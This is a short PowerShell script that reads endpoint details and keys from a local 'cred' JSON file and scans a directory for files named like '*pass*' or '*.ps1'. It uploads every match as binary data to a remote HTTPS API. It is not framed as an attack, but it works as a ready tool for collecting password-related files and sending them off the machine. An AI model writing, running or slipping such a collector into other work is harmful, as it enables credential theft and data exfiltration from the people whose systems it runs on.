# Specify the directory to search (replace 'C:\Path\To\Search' with your actual directory)
$sourceDirectory = 'C:\Path\To\Search'

# Path to the credentials JSON file
$credentialsFile = Join-Path -Path $PSScriptRoot -ChildPath 'cred'

# Function to read credentials from JSON file
function Get-Credentials {
    $credJson = Get-Content -Path $credentialsFile -Raw | ConvertFrom-Json
    return $credJson
}

# Array of file name patterns to search for
$filePatterns = "*pass*", "*.ps1", "other..."

# Function to send file to API endpoint
function Send-FileToAPI {
    param (
        [string]$filePath,
        [string]$apiUrl,
        [string]$espId,
        [string]$deliveryKey,
        [string]$encryptionPassword
    )

    try {
        # Prepare headers and payload
        $headers = @{
            "esp-id" = $espId
            "delivery-key" = $deliveryKey
            "encryption-password" = $encryptionPassword
        }
        
        # Send file as binary data to API using Invoke-RestMethod
        $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -InFile $filePath -ContentType "application/octet-stream"
        
        Write-Output "File $($filePath) successfully sent to API."
    } catch {
        Write-Output "Failed to send file $($filePath) to API. Error: $_"
    }
}

# Read credentials from JSON file
$credentials = Get-Credentials

# Iterate through each file pattern
foreach ($pattern in $filePatterns) {
    # Search for files matching the current pattern in the source directory
    $files = Get-ChildItem -Path $sourceDirectory -Filter $pattern -File -ErrorAction SilentlyContinue

    if ($files) {
        foreach ($file in $files) {
            # Send the file to the API
            Send-FileToAPI -filePath $file.FullName `
                           -apiUrl ("https://" + $credentials.URL + ":" + $credentials.Port) `
                           -espId $credentials.esp_id `
                           -deliveryKey $credentials.delivery_key `
                           -encryptionPassword $credentials.encryption_password
        }
    } else {
        Write-Output "No files matching pattern '$pattern' found in $sourceDirectory."
    }
}

Write-Output "Script execution completed."
